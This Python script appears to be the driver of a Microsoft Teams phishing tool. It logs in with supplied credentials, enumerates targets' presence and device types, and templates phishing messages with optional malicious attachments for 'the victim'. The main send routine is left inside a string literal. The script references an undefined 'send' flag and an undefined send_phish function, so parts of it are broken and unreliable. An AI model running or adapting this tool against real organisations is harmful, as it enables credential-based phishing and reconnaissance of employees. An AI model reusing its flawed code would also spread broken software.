import argparse
import csv
import sys
import time
from pathlib import Path

import chevron
import teams_api
import yaml
from loguru import logger
from prettytable import PrettyTable
from teams_user import TeamsUser


def build_argparser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-u", "--username", dest="username", type=str, required=True, help="Username for authentication"
    )
    parser.add_argument(
        "-p", "--password", dest="password", type=str, required=True, help="Password for authentication"
    )
    parser.add_argument(
        "-l",
        "--list",
        dest="list",
        type=str,
        default=None,
        required=False,
        help="Full path to a file containing target emails. One per line.",
    )
    parser.add_argument(
        "-c",
        "--configuration",
        dest="configuration",
        default=None,
        type=str,
        required=False,
        help="Full path to a file containing the configuration to the room and message.",
    )
    parser.add_argument(
        "-a",
        "--attachment",
        dest="attachment",
        default=None,
        type=str,
        required=False,
        help="Full path to the attachment which will be sent to the victim.",
    )
    parser.add_argument(
        "-s",
        "--sharepoint",
        dest="sharepoint",
        type=str,
        required=False,
        default=None,
        help="Manually specify sharepoint name (e.g. mytenant.sharepoint.com would be --sharepoint mytenant)",
    )
    parser.add_argument(
        "--no-confirm",
        dest="interactive",
        required=False,
        action="store_false",
        help="Do not ask for confirmation before sending a phishing message to a victim.",
    )
    parser.add_argument(
        "--enum-users",
        dest="enum_users",
        required=False,
        default=False,
        action="store_true",
        help="Run in enumeration mode. Only print user emails and status information.",
    )
    parser.add_argument(
        "--dry-run",
        dest="dry_run",
        required=False,
        default=False,
        action="store_true",
        help="Run in dry run mode. Print status",
    )
    parser.add_argument(
        "--dry-run-self",
        dest="dry_run_self",
        required=False,
        default=False,
        action="store_true",
        help="Run in dry run self mode. Print status",
    )
    return parser


def create_thread_by_method(method):
    sw = {"closed_chat": teams_api.chat_create_closed_chat, "meeting": teams_api.chat_create_meeting}
    return sw.get(method)


def print_users_status(bearer_token, users):
    statuses = []

    for email in users:
        user = TeamsUser(bearer_token, email)
        ustatus = user.get_status()
        if ustatus:
            time.sleep(0.33)
            mri = ustatus["mri"]
            user_info = user.check_teams_presence(mri)[0]
            presence = user_info["presence"]
            availability = presence["availability"]
            # color = availability_map[availability]
            # status = [email, parse(f"<{color}>{availability}</{color}>"), presence["deviceType"], mri]
            status = [email, availability, presence.get("deviceType")]
            statuses.append(status)
        else:
            statuses.append([email, "Could not read", "Could not read"])

    table = PrettyTable()
    table.field_names = ["Email", "Availability", "Device Type"]
    table.add_rows(statuses)
    print(table)

    with open("user_status.csv", "w", newline="") as f:
        writer = csv.writer(f)
        writer.writerows(statuses)


def convert_str_to_html(s):
    lines = s.splitlines()
    return "\n".join([f"<p>{line if len(line) != 0 else '&nbsp;'}</p>" for line in lines])


if __name__ == "__main__":
    args = build_argparser().parse_args()

    configuration = None
    if args.configuration and Path(args.configuration).is_file():
        with open(args.configuration) as file:
            configuration = yaml.safe_load(file)
        if configuration.get("log"):
            logger.add(configuration.get("log"))

    if args.enum_users:
        logger.info("Running in enumeration mode.")

    if args.configuration and args.list:
        logger.error("Cannot use both configuration file and list parameters at the same time.")
        sys.exit(1)

    to_upload = None

    users = None
    list_path = None
    list_path = Path(args.list) if args.list else Path(configuration["user_list"])

    if list_path.is_file():
        users = list_path.read_text().strip().splitlines()
    else:
        logger.error("User list file does not exist or it is not a file!")
        sys.exit(1)

    bearer_token, skype_token, sharepoint_token, sender_info = teams_api.authenticate(
        args.username, args.password, args.sharepoint
    )

    if args.sharepoint:
        sender_sharepoint_url = "https://%s-my.sharepoint.com" % (args.sharepoint)
    else:
        sender_sharepoint_url = "https://%s-my.sharepoint.com" % sender_info.get("tenantName")

    sender_drive = args.username.replace("@", "_").replace(".", "_").lower()

    method = "closed_chat"
    if configuration.get("method"):
        method = configuration.get("method")

    if args.enum_users:
        print_users_status(bearer_token, users)
        sys.exit(0)

    if args.dry_run and configuration:
        total = len(users)
        successes = 0
        for i, u in enumerate(users):
            logger.info(f"Sending message to {u} ({i+1}/{total})")
            ustatus = TeamsUser(bearer_token, u).get_status()

            if not ustatus:
                logger.warning(f"Could not get status for user: {u}. Skipping...")
                continue

            if not ustatus.get("displayName"):
                logger.warning(f"Could not get displayName for user: {u}. Skipping...")
                continue

            ustatus["displayName"] = ustatus["displayName"].title()

            logger.info(f"Creating meeting with {ustatus.get('displayName')}, {configuration['chat_title']} as name")

            template = configuration["message"]
            message = convert_str_to_html(chevron.render(template, ustatus))
            print(message)
            logger.success(f"Message sent to {u}")
            successes += 1

        logger.info(f"Sent {successes}/{total} messages succesfully!")

        sys.exit(0)

    if args.send and configuration:
        total = len(users)
        successes = 0

        upload_info = None
        """
        if to_upload:
            upload_info = teams_api.file_upload(
                sharepoint_token, sender_sharepoint_url, sender_drive, to_upload, sender_info
            )

        for i, u in enumerate(users):
            logger.info(f"Sending message to {u} ({i+1}/{total})")
            template = configuration["message"]
            time.sleep(1)
            if send_phish(
                bearer_token,
                skype_token,
                sender_sharepoint_url,
                sender_drive,
                sender_info,
                configuration["chat_title"],
                u,
                template,
                preview=False,
                upload_info=upload_info,
                method=method,
                interactive=args.interactive,
            ):
                successes += 1
        logger.info(f"Sent {successes}/{total} messages succesfully!")

        sys.exit(0)
        """
